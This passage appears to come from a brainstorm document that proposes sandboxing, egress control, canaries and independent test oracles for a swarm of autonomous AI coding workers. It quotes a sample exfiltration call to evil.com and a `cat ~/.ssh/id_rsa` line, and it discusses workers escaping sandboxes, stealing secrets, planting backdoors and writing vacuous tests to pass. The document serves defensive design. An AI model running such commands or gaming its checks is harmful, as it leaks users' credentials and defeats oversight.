- **Kill graphify; hand workers the static CONSTRAINTS doc that already exists** `small/rash` _(curated)_ — Invert the idea that graphify is a live, queried-before-every-grep shared map. Brownfield here doesn't need a live graph; it needs a single human-curated CONSTRAINTS.md — the Drizzle-on-Vercel gotcha, the RLS rule, the cadence configs, the byte-protected paths — most of which ALREADY lives in this repo's CLAUDE.md (7 gotchas, three cadence knobs, the protected-asset list). Delete the graph-ingestion machinery and hand workers the static doc. **Why better:** This repo already encodes its load-bearing brownfield constraints as prose a worker reads in seconds. Building a queryable as-built verification graph to rediscover facts the maintainer already wrote down is enormous effort to reproduce an existing, better artifact. The real constraints are few, sharp, and textual — not graph-shaped.

### Trust boundary of autonomous code execution & secret exposure

_Current assumption: Headless workers spawn freely ('claude -p / codex exec' with danger-full-access implied) and run generated code (tests, builds) with no stated sandbox boundary. Unstated: an autonomous swarm executing AI-generated code on the dev machine is a live security surface — generated test/build code can exfiltrate .env.local secrets, hit the network, touch the real Supabase prod DB, or persist outside its worktree. The Tower's own rules forbid committing secrets and ArtLab keeps secrets in Keychain/env only, yet the factory hypothesis has no sandbox/egress/credential-scoping model for what a worker is allowed to touch. Autonomy without a blast-radius boundary is the dangerous default._

**Boldest reframe:** The factory must not run tests at all — proof replaces execution

- **Synthetic-secret worktree by default** `small/reasonable` _(curated)_ — Every spawned worker's worktree gets a generated .env.local containing only fake-but-well-formed values (sk_test_FAKE..., a throwaway Supabase URL, dummy FAL_KEY). The real .env.local is git-ignored and never copied into a worktree; workers literally cannot read a live key because it isn't there. A node-type allowlist promotes a worker to real credentials only when its contract declares it needs them (e.g. a Stripe integration leaf). **Why better:** Default-deny by absence beats default-allow by inheritance: the current assumption lets a worktree inherit the dev machine's .env.local, so one malicious generated test exfiltrates the Stripe and Supabase service-role keys. Fakes mean a leak leaks nothing, and well-formed shapes keep generated code compiling/running.
- **Egress-deny test/build sandbox** `big/reasonable` _(curated)_ — Run every worker's `npm test` / `npm run build` inside a Vercel Sandbox (Firecracker microVM, already a listed skill) or a local network-namespace jail with outbound network OFF by default. A node opts into a tight egress allowlist (e.g. api.anthropic.com, fal.run) declared in its contract; everything else is dropped. **Why better:** AI-generated test code is the exfil vector — even with fake secrets, a worker can phone out the plan-tree, source, or a discovered prod URL. No-egress-by-default turns 'a worker can hit the network' from an unstated default into an explicit, auditable per-node grant, and Tower already has vercel:vercel-sandbox on hand for exactly this.
- **Prod DB is structurally unreachable from the swarm** `small/reasonable` _(curated)_ — Point every worker at an ephemeral throwaway Supabase branch / local Postgres seeded from schema-only, and inject ONLY that connection string. The real db.jzrsrruugcajohvvmevg host and SUPABASE_SERVICE_ROLE_KEY are withheld from worker env entirely; a worker that tries the prod host fails to resolve. **Why better:** Today's assumption gives workers whatever DB creds are in env — and the service-role key BYPASSES RLS, so a single bad migration or seed script can drop or read real user data. Scoping workers to a disposable schema-shaped DB makes touching the real prod DB impossible rather than merely discouraged.
- **Secret-shaped tripwire canaries in every worktree** `small/reasonable` _(curated)_ — Plant honeytoken values (a fake AWS key, a fake Stripe sk_live, a canary URL) in each worktree's fake env and in a decoy ~/.npmrc. The orchestrator watches for any process that reads those files or any outbound request carrying a canary string, and instantly kills + quarantines that worker. **Why better:** The current model has no detection at all — a worker could read .env.local and you'd never know. Canaries convert silent exfiltration into a loud, immediate signal and give the cockpit a concrete 'worker N touched secrets' event, turning trust from an assumption into a monitored property.
- **Pre-flight static scan that gates a leaf before it runs** `small/reasonable` _(curated)_ — Before any generated leaf's tests/build execute, run a cheap deterministic scan (ripgrep + a tiny ruleset) over the diff for danger signals: reads of process.env for non-declared keys, child_process/exec, fetch to non-allowlisted hosts, fs writes outside the worktree. A hit blocks execution and bounces the node back to the model with the violation. **Why better:** The hypothesis runs generated code with zero inspection. A scan is the cheapest possible blast-radius reducer — it catches the obvious exfil/escape patterns before they ever execute, and folds naturally into the existing graphify 'does reality match the contract' verification step.
- **Capability manifest as a first-class contract field** `big/reasonable` _(curated)_ — Make the frozen top-down contract for each node declare its capabilities explicitly: filesystem scope, network egress allowlist, secrets needed, DB access (none/read-disposable/write-disposable). The orchestrator enforces exactly that envelope and shows it in the cockpit's scope-preview gate, so a leaf that quietly tries more than it declared is a contract violation, not a surprise. **Why better:** Right now autonomy has no declared envelope, so 'what is a worker allowed to touch' is undefined and unbounded. Folding least-privilege INTO the contract that's already frozen top-down means the security boundary rides the system's core mechanism for free, is visible at the same scope-gate where the user approves spend, and makes overreach mechanically detectable.
- **Two-tier altitude trust: T0-T1 fully auto, T2-T3 gate the touch-real moment** `small/reasonable` _(curated)_ — Tie execution privilege to the altitude dial. Low tiers (component/feature leaves) run fully autonomous in the no-egress fake-secret sandbox; only T2-T3 work that genuinely needs a real credential, real DB write, or network call pauses at a one-tap human approval — the same way ArtLab's two human gates work. **Why better:** The current 'zero human interaction mid-run' is the right default for 99% of leaves but a dangerous absolute for the 1% that touch money/prod/secrets. Binding the human gate to altitude preserves the autonomous swarm where it's safe and inserts a checkpoint precisely at the irreversible/credentialed moments — matching the proven ArtLab gate philosophy.
- **Capability-Token Mint / keychain broker: workers get scoped, expiring tickets, never real keys** `big/reasonable` _(curated)_ — No worker ever sees a raw secret. A single privileged broker (extending ArtLab's existing macOS Keychain `tower-artlab` pattern) holds FAL_KEY, the Supabase service-role key, and git push creds; each worker is born with a short-lived, per-node capability token saying exactly what it may do ('spend up to $0.40 of FAL on character gen', 'write only to worktree /forge/node-742', 'read 3 named tables'). The broker proxies the real call and logs every grant; the token dies when the leaf goes green. **Why better:** Tower already SOLVED secret storage for ArtLab (Keychain, never env) but the factory regresses to a flat .env.local every worker inherits, so one malicious test exfiltrates everything. A broker gives per-worker, per-capability, time-boxed, fully-audited access — the difference between every worker holding the master keyring and every worker asking for one labeled key it must justify, with blast radius capped at a single leaf's budget.
- **Hermetic microVM per worker — the worktree IS the universe** `big/rash` _(curated)_ — Every headless worker boots inside its own Firecracker/Vercel-Sandbox microVM whose entire filesystem is just its git worktree plus a pinned toolchain. No .env.local on disk, no macOS Keychain reachable, no host home directory mounted. Network is default-deny; the only route out is the capability broker socket. The cell is destroyed (incinerated) when the leaf is done, so a worker that tries to write to ~/.ssh or a sibling's worktree is writing into a box that's about to vanish. **Why better:** The hypothesis runs AI-generated build/test code directly on the dev machine with the user's whole life one `cat ~/.ssh/id_rsa` away. A hermetic, disposable VM means generated code physically cannot touch the host's secrets, prod DB, or other nodes — the worktree boundary becomes real instead of honor-system, so 'more processes = more power' stops meaning 'more identical full-access blast radii.'
- **Two-DB Mirror: workers only ever see a synthetic prod, never the real one** `big/reasonable` _(curated)_ — The factory never lets a worker connect to the real Supabase. A branch DB is forked (schema + scrubbed/synthetic rows) the instant a run starts; all worker queries hit the mirror. The real prod connection string exists only in the stitch-and-promote agent that runs after the green wave, behind a human gate. **Why better:** The current model has no separation between AI experimenting with generated migrations and the live production DB. A disposable mirror means a hallucinated `DROP TABLE` in a test costs a throwaway branch, not the user's real applications/contacts/offers.
- **Egress Customs House: every outbound packet is inspected and allowlisted** `small/reasonable` _(curated)_ — A transparent proxy sits in front of all worker network traffic. Each node declares its allowed destinations in the manifest (api.anthropic.com, api.openai.com, fal.run, the branch DB host) and EVERYTHING else is blocked and logged. Any attempt to POST to an unknown host is treated as an exfiltration event that quarantines the node. **Why better:** Right now a generated test can `fetch('https://evil.com', {body: env})` silently. A declared-egress customs house turns secret exfiltration from invisible-and-easy into blocked-and-alarmed — and gives the cockpit a real network audit trail per node.
- **Provenance-signed artifacts: nothing merges that a worker can't cryptographically vouch for** `big/rash` _(curated)_ — Every file a worker produces is hash-signed with its node's ephemeral key and chained to the contract it was built against. The stitch wave refuses to merge any artifact whose signature, contract hash, or worktree boundary doesn't verify — and graphify's as-built check becomes a supply-chain attestation: 'this code came from THIS node, built THIS contract, ran THESE commands.' **Why better:** The factory assumes generated code is trustworthy once tests pass, but a poisoned worker could write code outside its contract or smuggle a backdoor past green tests. Provenance signing makes the merge gate verify origin and scope, not just 'tests green' — supply-chain integrity for AI-authored code.
- **Blast-Radius Dial wired to the Altitude Dial** `small/reasonable` _(curated)_ — Trust auto-scales with scope. A T0 single-component run gets a fast loose sandbox (it can't touch much anyway); a T3 whole-app run with prod-DB and push capabilities auto-escalates to full microVM isolation, egress customs, mandatory human gates, and dual-model review of any privileged action. The same dial that sizes the swarm sizes the cage. **Why better:** A one-size sandbox is either too strict for trivial work (friction) or too loose for app-wide work (catastrophe). Binding the trust boundary to the existing altitude classification means danger and protection rise together automatically, instead of a single static 'danger-full-access' default for everything.
- **Red-Team Worker: an adversary node tries to escape every run, on purpose** `big/rash` _(curated)_ — Spawn one extra worker per run whose entire job is to break out — exfiltrate the (decoy) secrets, escape its worktree, reach the real prod DB, phone home. If it ever succeeds, the run is structurally unsafe and is halted before the swarm ships; its escape report becomes a regression test for the sandbox itself. **Why better:** The current model assumes the sandbox holds without ever testing it; sandboxes rot silently after every dependency bump. A continuous embedded red-team turns 'we hope the boundary is intact' into 'we prove it on every run' — the cage is verified by attack, not by faith.
- **Workers are untrusted contractors with a badge, not extensions of self** `big/reasonable` _(curated)_ — Flip the mental model: an AI-authored worker is a stranger let into the building's loading dock, never a trusted limb of the orchestrator. Every worker gets a named, badged identity with a posted capability sheet (what files, what network, what creds) the way a Tower character has a defined floor — and the default badge grants nothing until the plan-node explicitly requests it. **Why better:** The current default ('spawn freely, inherit everything') is the loading-dock left unlocked. Treating each worker as a contractor with a badge makes least-privilege the natural state instead of an afterthought, and it fits the building metaphor — strangers don't roam the penthouse.
- **Bazel-style hermetic sandbox: nothing enters a worktree unless a node declares it as input** `big/reasonable` _(curated)_ — Steal Bazel/Nx remote-execution hermeticity: a worker starts in an EMPTY sandbox (clean tmp filesystem, no env, no network) and only the files, env vars, and egress hosts that its plan-node's contract explicitly DECLARES as inputs get mounted in. `.env.local` is never on the worktree's path; a leaf that needs `FAL_KEY` must name it, and naming `SUPABASE_SERVICE_ROLE_KEY` on a 'render a button' node is a contract violation rejected before spawn. **Why better:** The current default is 'worker inherits the whole machine + all of .env.local by ambient filesystem access.' Hermeticity inverts it to deny-by-default: a worker's blast radius is exactly its declared inputs, so an exfiltration attempt has nothing to read and nowhere to send it. As a bonus it makes builds reproducible, which is why Bazel does it.
- **Manufacturing 'andon cord' tripwire that halts the whole line on first anomalous syscall** `small/rash` _(curated)_ — Borrow Toyota's andon cord: any worker that attempts an undeclared network connection, a write outside its worktree, or a read of a protected path (`.env*`, `~/.aws`, Keychain) doesn't just fail its own node — it pulls the cord and PAUSES the entire swarm, freezing every sibling worker until a human or policy clears it. The offending node's diff and triggering syscall surface in the cockpit. **Why better:** Today a malicious or hallucinated worker fails silently or not at all, and the other 20 workers keep spending tokens and touching the machine. Treating the first boundary violation as a line-stop (not a per-node retry) means one compromised leaf can't be lost in the noise of a big parallel run — the blast radius is frozen at detection, not at the end of the run.
- **Temporal/LangGraph durable side-effect ledger — every privileged action is a logged, replayable, signed event** `big/rash` _(curated)_ — Steal workflow engines' insistence that side effects go through the engine, not raw I/O. Workers can't `fetch`, `fs.write` outside worktree, or touch a DB directly — they emit ACTIVITY REQUESTS ('write file X', 'call host Y', 'run migration Z') that the orchestrator executes against policy and records in an append-only, content-addressed ledger. Replaying the ledger reconstructs exactly what every worker touched; unsigned/undeclared effects simply don't happen. **Why better:** Right now privileged actions are invisible ambient capabilities — you can't audit what a worker did after the fact, and graphify's as-built check has nothing to diff side effects against. A side-effect ledger turns the trust boundary into a reviewable, replayable artifact: the cockpit shows every byte that left a worktree, and graphify can verify reality matched the contract for I/O, not just for code.
- **Biology's two-key restriction-enzyme gate: destructive ops need orchestrator + human co-signature** `small/reasonable` _(curated)_ — Borrow the cell's defense where a dangerous enzyme is inert until two conditions co-occur. Class the action space by irreversibility (read-only / worktree-local write / shared-state mutation / external-effect). The bottom two tiers run autonomously; the top two (prod DB writes, `git push`, real-money Stripe calls, secret reads) are CRYPTOGRAPHICALLY INERT inside a worker — they require a capability token the worker cannot mint, only the orchestrator can, and only after a cockpit co-sign. Generalize ArtLab's 'approved for app' phrase into a capability lattice. **Why better:** The hypothesis has a single autonomy switch (on), so a worker that CAN run a build CAN also push to main or charge a card. A capability lattice makes autonomy proportional to irreversibility — 95% of work stays fully autonomous, while the handful of irreversible actions inherit ArtLab's proven two-gate model instead of riding the same blanket 'danger-full-access' as a CSS tweak.
- **Content-hash poison detection: fingerprint inputs/outputs and quarantine boundary drift** `small/reasonable` _(curated)_ — Steal Turborepo/Nx's input-output hashing, but use it as a security signal. Each node's contract pins a hash of its allowed inputs; a worker whose process touched files NOT in its input hash, or whose output diff edits files OUTSIDE its declared node boundary (e.g. a 'leaf button' worker silently editing `src/lib/supabase/server.ts` or `.github/workflows/`), gets its whole worktree quarantined and its diff held out of the green-wave stitch pending review. **Why better:** The mechanical bottom-up stitch currently trusts that each worker only changed its own subtree — a prompt-injected or hallucinating worker could plant a backdoor in a shared auth/CI file and the green wave would happily merge it. Boundary-hashing makes 'stayed inside its lane' a verifiable gate, so cross-cutting tampering can't ride the stitch into main undetected.
- **Per-worker resource budget that starves a runaway worker** `small/rash` _(curated)_ — Treat the trust boundary as also a RESOURCE boundary, the way Airflow pools and Inngest concurrency limits cap a task. Every worker gets a metered budget: max tokens, max wall-clock, max egress bytes, max files written, max child processes. A worker that tries to spin up a crypto miner, fork-bomb, or exfiltrate a large dump hits a hard ceiling and is killed — the budget is the circuit breaker even for behavior the egress allowlist didn't anticipate. **Why better:** The 'more processes = more power' framing has no upper bound, so a compromised or looping worker can consume the whole $200+$100 quota or saturate the machine before anyone notices. Hard per-worker resource budgets cap the cost of a single bad actor and give the cockpit a live 'this worker is behaving abnormally' signal that pure allowlisting misses.
- **An egress ledger as a first-class panel in the cockpit** `small/reasonable` _(curated)_ — Every byte a worker sends to the network and every credential it touches streams into the Forge cockpit as a live 'egress ledger' — a per-node feed of 'node 7 read TEST_DB_URL, opened api.openai.com (412KB), attempted db.jzrs...prod (BLOCKED).' The graphify verification layer asserts not just 'does the code match the contract' but 'did this node only touch what its capability manifest declared.' **Why better:** The cockpit already plans to show plan-tree, model badges, tokens, failover — but security is invisible in that list. Surfacing egress/credential touches as a watchable stream makes the trust boundary observable instead of assumed, and extends graphify from 'reality matches the code contract' to 'reality matches the security contract.' You can't trust autonomy you can't watch.
- **Capability earned by reputation, not granted by default** `small/rash` _(curated)_ — Workers start at the lowest trust tier (no net, no creds, read-only-plus-own-worktree). A node only earns a higher capability tier — network, a scoped token — after a cheap pre-flight judge (the Claude architect or a Codex reviewer) reads the leaf and certifies it genuinely needs it. Repeated clean runs of a node-type raise its standing trust; one violation drops it to probation. **Why better:** The current default is uniform maximal trust. A reputation/tier model makes capability proportional to demonstrated need and track record — most leaves (a component, a test, a doc) provably need nothing, so they get nothing, while the rare leaf that truly needs the DB gets a justified, logged grant. It replaces a binary trust switch with a dial that matches the altitude dial the factory already has.
- **Delete the trust boundary by deleting local execution: the factory never runs generated code on this machine** `big/reasonable` _(curated)_ — Invert the premise. The dangerous surface is 'autonomous swarm executes AI-generated code on the dev box that holds 30 prod secrets.' So don't. Workers only WRITE files and run tsc/lint (pure static analysis, no secrets, no network); every test/build that actually executes code happens in a throwaway CI/ephemeral VM with zero credentials. The boundary you were going to design doesn't need to exist because nothing trusted and nothing dangerous ever share an address space. **Why better:** A sandbox is a wall you must prove unbreakable forever; physical separation is a property you get for free. You can't exfiltrate SERVICE_ROLE_KEY from a process that was never given it. Removes the entire blast-radius design problem instead of mitigating it.
- **There is no .env.local — the dev machine holds zero real secrets** `big/reasonable` _(curated)_ — The real bug isn't autonomy, it's that the dev machine is a credential honeypot: live Stripe, RLS-bypassing service role, prepaid FAL_KEY, Claude OAuth token, all in plaintext one `cat` away. Invert: the factory mandates the workstation only ever holds short-lived, scope-minimized, mock/sandbox-tier credentials (Stripe test mode, a throwaway Supabase branch DB, a $0-cap FAL key). Real prod secrets live only in CI behind a human gate. Now an uncontained worker reading every env var is a non-event. **Why better:** Sandboxing assumes the secrets are worth protecting and tries to keep code away from them; this makes the secrets not worth stealing. The strongest secret defense is having nothing valuable to steal. Also fixes a risk that exists TODAY, independent of the factory.
- **Merge the trust boundary into graphify — the contract graph IS the permission system** `big/reasonable` _(curated)_ — Don't build a separate sandbox/egress subsystem. The factory already freezes a contract per node (typed signatures, schema, tests). Extend the contract to declare capabilities: this leaf touches files X, needs DB tables Y read-only, needs network host Z or none. The worker is launched with exactly those grants derived from its frozen contract, and graphify's as-built verification fails the node if it reached for anything outside its declared surface. **Why better:** Replaces a bolt-on guard nobody maintains with a capability that's a natural consequence of a contract you're freezing anyway. Least-privilege becomes automatic and per-leaf instead of one coarse machine-wide setting. The boundary isn't a separate aspect, it dissolves into the plan-tree.
- **Quarantine-by-default, promote on green — autonomy is earned, not the starting state** `small/reasonable` _(curated)_ — Current assumption: workers spawn freely, zero human interaction mid-run, danger-full-access implied. Flip it. Default posture is maximum quarantine (no net, no secrets, read-only repo, write only to worktree); a node EARNS more capability only by passing cheaper checks first, and the human scope-gate you already planned spends trust, not just dollars. Power is the reward for proven-safe leaves, not the starting condition. **Why better:** Matches the repo's own ethos: ArtLab already has two human gates and 'self-evolution drafts branches only, never opens PRs.' 'More processes = more power' as a starting stance contradicts that culture. Quarantine-by-default means a prompt-injected or hallucinated leaf fails closed instead of open.
- **Kill the on-prem orchestrator entirely — the factory is a hosted CI pipeline, not a daemon on your laptop** `big/rash` _(curated)_ — The whole 'main agent spawns headless processes in worktrees on the dev machine' architecture is the thing creating the trust boundary. Delete it. The factory's execution layer is GitHub Actions / Vercel Sandbox / ephemeral microVMs that are designed for untrusted code, already network-isolated, already credential-scoped per job, and already disposable. Your laptop becomes a thin cockpit that dispatches and watches. **Why better:** You'd be reinventing, badly, the sandbox isolation that Vercel Sandbox (Firecracker microVMs for exactly 'untrusted code / AI agents') and CI runners already ship hardened. Building your own blast-radius model on a Mac is choosing to own a security surface someone else already solved. Cheaper, safer, and the cockpit stays.
- **The factory must not run tests at all — proof replaces execution** `big/rash` _(curated)_ — A radical inversion of 'workers run tests/builds.' The factory's whole pitch is contracts + failing tests + typed signatures. Lean all the way in: verification is type-checking and static/structural proof against the contract graph, not running arbitrary generated code. If a leaf's correctness can only be established by executing it, the contract was too loose, so recurse further. Execution becomes a rare, explicitly-flagged escalation, not the default verification step. **Why better:** Removes the attack vector at the root: AI-generated code that never runs can't exfiltrate, can't hit the network, can't touch prod. It also pressures the plan-tree toward genuinely Codex-ready leaves (tight enough to prove, not just to run), which is the factory's stated quality bar anyway.
- **There is no 'dev machine' — the factory is the boundary, and it owns its own world** `big/rash` _(curated)_ — Stop treating the factory as a tenant inside your existing dev environment that happens to have prod creds lying around. Invert: the factory is a self-contained appliance with its OWN filesystem, OWN (mock) credential store, OWN network namespace, with no path to your real .env.local, real Keychain entries, or real Supabase. The 'trust boundary' isn't a feature inside the factory; the factory IS the boundary, and 'what is a worker allowed to touch' is answered by 'only what's inside the appliance.' **Why better:** Reframes the problem so there's nothing to scope: a worker can't be over-permissioned to resources that don't exist in its universe. Instead of enumerating denies (egress rules, secret allowlists) forever, you enumerate the tiny set of allows once at the appliance border. Containment by construction beats containment by policy.

### What 'green' actually means — the ground-truth oracle problem

_Current assumption: The pipeline equates 'all tests green' with 'done' — a green wave climbing the tree IS the success signal. Unstated: the tests were WRITTEN BY THE SAME MODEL FAMILY that builds the code, so green proves self-consistency, not correctness against the user's actual intent. There is no independent ground-truth oracle (does it do what the human MEANT?), no guard against the model writing a vacuous/tautological test to turn a leaf green, and no acceptance check at the ARTIFACT level (the running app, the real deck, the actual decision) versus the leaf level. The Tower already has tower-ship-gate (tsc/lint/vitest/build/e2e) as a real oracle — the factory needs that as its top-of-tree gate, not just leaf tests it authored itself._

**Boldest reframe:** 'Green' is a lie — replace the green wave with a RED-team climb: a node is 'done' only when a swarm of adversarial breaker-agents runs out of attacks against it, not when its builder's tests pass. This is the single boldest reframe because it inverts the factory's core mechanic (the success signal itself) rather than merely strengthening or relocating the existing oracle — it swaps a confirmation-bias signal (it confirms itself) for a Popperian falsification signal (it survived everyone trying to kill it), and that reframe structurally subsumes most of the other ideas (mutation testing, adversarial/hostile authorship, differential oracles, and human spot-checks all become 'attacks' in the climb).

- **Cross-family test authorship: the builder never grades its own homework** `small/reasonable` _(curated)_ — Hard rule recorded as author-model on every test in the manifest: whichever model family builds a leaf may not author that leaf's tests. The other family froze the contract+tests top-down; a leaf is green only when it passes tests written by the opposite family, and quota-failover may never collapse both roles onto one model for the same node. Same-family green is recorded but never counts as 'done' — it is demoted from oracle to hint. **Why better:** The whole weakness of 'green' is that one mind wrote both the code and the check, so green proves self-consistency, not correctness. Splitting authorship across families is a near-free structural fix that turns the already-existing two-model router into an independent oracle instead of a productivity trick — a sibling has no incentive to write the vacuous test that lets the other's leaf pass.
- **The Adversary Family: a third, hostile pass paid to keep your leaf red** `big/reasonable` _(curated)_ — Beyond friend-vs-builder split, spawn a deliberately hostile model whose only job is to PROVE the leaf wrong — author intent-faithful counterexamples, boundary cases, and the spec's implicit promises that the implementation fails. A leaf is done only after it survives a round where the adversary genuinely tried and failed to break it with tests that should pass given the intent. **Why better:** Current 'a different model reviews' is reactive and capped at a few polite rounds. Making the oracle proactively hostile and intent-anchored turns 'all tests pass' into genuine agreement between parties that want opposite outcomes — green earned against an enemy hunting intent-violations is a far stronger truth signal than green against the builder's own friendly suite.
- **Intent-as-Oracle: freeze the user's MEANING as immutable acceptance scenarios** `big/reasonable` _(curated)_ — At the very top of the plan-tree, before contracts, capture the user's intent as plain-language acceptance scenarios in their own words ('a logged-out user clicking Enter sees the lobby, then the elevator opens to the floor they picked'). A separate oracle-role model (never the builder) owns them; failing tests are GENERATED DOWN the tree from these scenarios and are immutable — builders satisfy them but can never edit them. Changing one requires re-opening the contract at a higher altitude. The green wave reaches the root only when these human-meaning scenarios pass against the running artifact. **Why better:** Unit tests encode the model's interpretation; acceptance scenarios encode the USER's intent. This gives green a second, intent-level dimension and kills the tautology at its root — green now proves 'matches an independently-authored intent statement,' not 'matches the builder's own guess.' The Tower's north-star-loop spec already proves this pattern; this generalizes it into the factory's ceiling.
- **Intent-anchored acceptance list frozen WITH every major node's contract** `small/reasonable` _(curated)_ — A lighter, per-node version: when each major node's contract is frozen, also freeze a short human-readable acceptance list (3-7 plain-English 'done when...' statements). The stitch step must demonstrate each statement passing, tracked separately from the unit tests, at every altitude — not only at the root. **Why better:** Gives the intent-level oracle granularity at every node instead of only the ceiling, so drift is caught at the subtree that caused it rather than only at the final artifact. Cheap, human-readable, and the repo already proves the pattern with its acceptance-walkthrough tests.
- **Mutation-test every leaf: kill the code, the test must scream** `small/reasonable` _(curated)_ — Before a leaf may turn green, the orchestrator injects N automatic mutations into the leaf's own implementation (flip a comparator, return null/constant, no-op a branch) and re-runs its tests. If any mutant survives — tests still pass with broken code — the suite is vacuous; the leaf stays RED, is flagged 'green-but-unproven,' and is bounced back for stronger assertions. Coverage is necessary but not sufficient; the test must demonstrably DIE when the subject is sabotaged. **Why better:** Directly attacks the cheapest cheat — a model writing assert(true) or a tautological test to escape a hard leaf. Mutation survival is mechanical, automatable, model-agnostic proof a test actually constrains behavior, converting 'all tests pass' into 'all tests can fail for the right reasons,' which raw pass/fail can never tell you.
- **Coverage + assertion-density floor before any leaf may go green** `small/reasonable` _(curated)_ — A leaf cannot report green unless its tests clear a minimum bar: they execute the changed lines they claim to (coverage of the diff) and contain real assertions (assertion count > 0; no empty bodies, no it.skip, no .only quietly passing). **Why better:** The smallest possible guard against the cheapest fakes — a test that runs the code and asserts nothing, or a skipped test that passes silently. Trivially shippable and fully automatable, it makes a green leaf mean 'something was actually checked' as a floor beneath the more expensive mutation gate.
- **Property + metamorphic contracts instead of hand-picked example tests** `small/reasonable` _(curated)_ — Freeze acceptance as PROPERTIES and metamorphic relations the artifact must always honor — 'round-trips invert,' 'sorts stay sorted,' 'every funnel stage sums to its parent,' 'reordering inputs doesn't change the total,' 'a deck always has a title slide,' 'every floor route returns 200 authed / redirects unauthed' — then fuzz them with thousands of generated cases. Green requires surviving the search, not three cases the author chose. Generalizes to decks/analyses via numeric invariants, not just code; the Tower's no-handwritten-svg test (walks the whole tree asserting an invariant) is exactly this shape. **Why better:** Example tests are precisely the surface a model can curate as both author and judge — it picks inputs it knows pass. Properties are claims about ALL inputs that an independent fuzzer attacks, so the builder can't overfit the oracle or quietly choose easy cases, removing the dependence on the author's honesty.
- **Cross-cutting invariant contracts that run across the whole tree** `small/reasonable` _(curated)_ — At freeze time, capture a few global invariants independent of any single leaf — 'every API route returns typed JSON or a 4xx,' 'no leaf reads Drizzle db at runtime,' 'totals never go negative' — as property/lint-style checks that run across the entire tree, not per-leaf example tests. **Why better:** Example tests check cases the model thought of; invariants check the cases it didn't, especially correctness violations that only emerge at stitch-time. The Tower already enforces invariants like the runtime-Drizzle guard and no-handwritten-svg, raising green from 'each leaf agrees with itself' to 'the whole respects the rules.'
- **Differential Oracle: build it twice, the disagreement is the bug** `big/rash` _(curated)_ — For any leaf with a checkable I/O surface, two independent worker lineages implement it from the same contract in isolation.
